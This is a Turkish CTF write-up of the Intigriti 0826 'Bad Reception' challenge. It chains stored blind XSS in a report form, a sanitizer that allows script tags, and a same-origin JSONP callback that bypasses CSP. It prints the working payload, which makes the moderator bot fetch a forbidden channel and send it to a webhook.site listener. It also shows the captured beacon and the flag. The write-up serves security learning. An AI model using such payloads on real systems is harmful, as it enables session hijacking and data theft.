---
title: 'Bad Reception: Kör XSS, JSONP ve bir Bot ile Intigriti 0826 Çözümü'
description: 'Intigriti Ağustos 2026 challenge çözümü: report formunda stored blind XSS, CSPyi devre dışı bırakan same-origin JSONP endpointi ve moderatör botundan gizli kanalın sızdırılması.'
pubDate: 2026-09-01
tags: ['ctf', 'xss', 'intigriti', 'csp-bypass', 'blind-xss', 'writeup']
cover: '/images/badreception-ch11.png'
---

Challengeın adı **Bad Reception**dı ve fikri tek cümleydi: ahşap kaplı 70ler tarzı bir televizyon, on kanal, hepsinde kar görüntüsü. Kanalın ötesinde bana yasaklı on birinci kanal vardı ve o kanalın yayınında flag gizliydi. İki önemli kural vardı: çözüm challenge sayfasındaki bir zafiyetten gelmeli ve writeup challenge bitene kadar yayınlanmamalı. Dün gece bitti, işte yazı.

Flag: `INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}`

## Zincirin özeti

Report formu (`POST /api/report`) `channelId` alanını tek kuralla doğruluyor: rakamla başlamalı. İlk karakterden sonrası saklanıyor ve daha sonra dışarıdan `403 forbidden` dönen gizli bir moderasyon sayfasında (`/moderate/<id>`) HTML olarak render ediliyor. O sayfayı headless Chrome ile bir moderatör botu geziyor. Sayfa içeriği temizliyor ve tüm inline event handlerları siliyor ama `<script>` etiketlerine izin veriyor. Ayrıca CSP olarak `script-src 'self'` set ediyor; bu normalde saldırıyı öldürür, ama sitenin kendi JSONP endpointi `callback` değerini doğrulamadan `application/javascript` olarak yansıtıyor ve same-origin script CSPyi geçiyor. Böylece kodum botun tarayıcısında çalışıyor, bot bana yasak olan 11. kanalı okuyor ve cevap, herkese açık bir video dosyasının adını ele veriyor. Flag o videonun içinde.

## Birinci gün: televizyonu kurcalamak

Sayfa kaynağı minicik: `GET /api/channels/{n}/load` çağıran bir tuş takımı, video kaynağını `^[A-Za-z0-9._-]+\.mp4$` regexine sabitleyen bir doğrulama ve köşede uyarı üçgeni şeklinde bir rapor butonu.

```
GET  /api/channels/{n}/load   n=1..10 -> "static.mp4", n>10 -> 403 "channel not available"
POST /api/report              channelId=<rakam+her şey> -> {"id":"<16hex>","status":"queued"}
```

İki endpoint. Uygulamanın tamamı bu. İstemci JSinde ayrıca yorum satırına çevrilmiş bir `X-Channel-Id` headerı var. Yorum satırı kodu geliştiricinin sana konuşmasıdır, önce onu kovaladım; sunucu tamamen yok sayıyormuş ama onu kovalarken diğer her şeyi haritaladım.

## Her şeyi yutan form

`channelId` üzerindeki doğrulama tek kural: ilk karakter rakam olacak. `1;id=1`, `1<b>x</b>`, hatta `1<svg>` denedim. Hepsi kabul, hepsi `queued`. İlk rakamdan sonrası saklanmadan depoya giriyor.

Sonra iz soğuyor. Cevap bana bir rapor idsi veriyor ve nerede render edildiğini görmek istiyorum. Akla gelen her görüntüleme rotasını denedim: `/report/<id>`, `/reports/<id>`, `/api/report/<id>`, query varyantları, `/challenge` altı yollar. Hepsi 404. Site kendi raporumu bana hiçbir yerde geri göstermiyor.

Geriye tek açıklama kalıyor: inputum okuyamadığım bir yerde render ediliyor. İç rotanın var olduğunu doğruladım, çünkü `GET /moderate/<id>` çıplak bir `403 "forbidden"` döndürüyor (9 bayt, uygulama seviyesi, her id için aynı, session olsun olmasın). Bu eksik rota değil, gerçek bir sayfanın önündeki kapı. Ağın içinde raporlarımı açan biri var. O zaman bu bir kör XSS.

## Üç tur sessizlik

webhook.site üzerinde bir dinleyici kurdum ve standart kör XSS matrisini ateşledim: `img onerror`, `svg onload`, attribute breakoutları, JS gerektirmeyen çıplak kaynak yüklemeleri. Her payloada hangisi ateşlenirse anlayayım diye ayrı işaret koydum.

Boş. İkinci tur, payloadları değiştirdim, boş. Üçüncü tur, yine boş.

Bu bölümde dürüst olayım çünkü gerçek zamanımı burada yaktım: exploite güvenmeyi bırakıp altyapıdan şüphelenmeye başladım. Bot uykuda mıydı? Botun dışarı trafiği engelli miydi? Dinleyicim mi bozuktu? Dinleyiciyi yeniden test ettim, collector değiştirdim, hatta JSi hiç olmayan payloadlar yolladım. Hepsi sessiz.

Cevap daha aptal ve daha ilginçti: o event handlerlar hiç var olmadı. Render tarafındaki bir temizleyici (DOMPurify sınıfı davranış) `onerror`, `onload`, `onfocus` ve arkadaşlarını sayfa daha parse edilmeden siliyor. Payloadlarım çalışma anında engellenmiyordu; doğarken siliniyordu. Handlerlı çıplak kaynak yüklemelerinin de ölmesi bundandı ve bana hayatta kalabilecek tek şeyin temizlenmeye değer attributeu olmayan bir element olduğunu söyledi.

## Gadget bir istek ötedeydi

Temizlemeden kurtulan şey: `<script>` elementinin kendisi. Bu alışılmadık ve kasıtlı; `script`i yeniden kabul eden bir temizleyici konfigürasyonu tek başına bugtır. Ama CSP `script-src 'self'` altında hayatta kalan bir `<script>`, origin bana JavaScript vermedikçe peri masalı değil mankattır. Endpoint listeme geri döndüm ve saatler önce sormam gereken soruyu sordum: bu originde, kontrol ettiğim JavaScriptle cevap veren bir URL var mı?

```
GET /api/jsonp?callback=alert(1)//

/**/ alert(1)//({"channels": 10});
```

İşte burada. Callback sıfır doğrulamayla yansıtılıyor, `application/javascript` olarak servis ediliyor ve sondaki `//` endpointin kendi JSON kuyruğunu yorum satırına çeviriyor. Same-origin script, CSP geç diyor ve `callback=`dan sonra ne yazarsam o benim programım.

İlk denemede çalışan exploiti yakan bir encoding notu: o URLin içindeki JavaScript `+` veya `&` içeremez. Body urlencoded olduğu için `+` boşluğa, `&` parametre ayırıcısına çözülür ve hangisi gelirse script `src`sini sessizce bozar. Exfil URLini template literal ve tek query parametresiyle kurdum.

## Payload

`POST /api/report`a `channelId` olarak gönderildi:

```
07<script src="/api/jsonp?callback=fetch('/api/channels/11/load').then(r=>r.text()).then(t=>fetch(`https://webhook.site/<my-uuid>?f=${t}`))//"></script>
```

Okunuşu: bot olarak 11. kanalın yayın adını çek ve bana getir.

Saniyeler sonra dinleyici ışıl ışıl:

```
GET https://webhook.site/<my-uuid>?f=3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_0) ... Chrome/136.0.0.0 Safari/537.36
```

O beacon tüm bugı tek satırda anlatıyor. Headless bir moderatör botu az önce benim JavaScriptimi çalıştırdı, bana `403 channel not available` diye cevap veren kanalı okudu ve sonucu kontrol ettiğim bir sunucuya taşıdı. Bot on kanalla sınırlı değil. Benim. Resmi ipuçlarının işaret ettiği tam da buydu: sinyali düzelt, on kanallık sınırı aş ve başkasına baktırıp report et.

## Videodaki ödeme

Dosya adı düz bir statik dosyaya işaret ediyor. Auth yok, imza yok. Onu saklayan tek şey isimdi:

```
GET /static/streams/3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4 -> 200 (15 KB)
```

On beş kilobaytlık H.264. ffmpeg ile karelere ayırdım ve 11. kanal sonunda net geldi:

![11. kanal, sonunda net](/images/badreception-ch11.png)

OSDde "CH 11" ve ekranda flag: `INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}`

Kötü sinyal, düzeltildi.

## Etki

Kimliği doğrulanmamış bir saldırgan "tek form göndermekten" uygulamanın kendi origininde moderatör botunun tarayıcısında rastgele JavaScript çalıştırmaya gidiyor. Botun yetkileri sonra devreye giriyor: normal kullanıcılara açıkça yasak bir kanalı okuyor ve dışarıya her oturum için kapalı olan dahili bir moderasyon sayfasına ulaşıyor. Sızdırılan kaynak, tek koruması tahmin edilemez adı olan herkese açık bir statik dosya ve XSS bunu doğrudan aşıyor. Rapor hız sınırı istemcinin kontrolündeki bir session cookieye bağlı ve cookieyi atarak kolayca aşılabiliyor. Gerçek bir dağıtımda bu admin tarayıcısı senaryosudur: saldırgan botun oturumuna ve kimliğine binerek dahili endpointleri okur ve botun dokunabildiği her şeyi dışarı sızdırır.

## Geçmişteki bana söyleyeceklerim

- Bir form her şeyi yutup hiçbir şeyi geri vermiyorsa, render yüzeyi başkasının tarayıcısıdır. Dinleyiciyi erken kur ama sessizliği "bot bozuk" olarak okuma; "vektörlerim ateşlenemeden siliniyor" olarak oku. Bunlar ters sorunlar, çözümleri de ters.
- Event handlerların hepsi ölmüşse temizleyiciyle savaşıyorsun demektir ve savaş elementler üzerinedir, attributelar üzerinde değil. `<script>`i geçiren bir temizleyici o sayfa için temizleyici değildir.
- CSP `script-src 'self'` gördüğünde kazanma yöntemi neredeyse hiçbir zaman politikayı daha akıllıca aşmak değildir. İzin verilen originde sana JavaScript uzatan endpointi bulmaktır. JSONP endpointi tek istek ötede, hiç incelenmemişken ben saatlerce karakter çalan CSS oracleı kurmakla uğraşıyordum.
- Adını exfil edebildiğin "gizli" statik dosya erişim kontrolü değildir. Botun 11. kanala erişimi düzgün gate edilmişti; işaret ettiği dosya değildi. İkisini zincirle ve kapı süs olur.
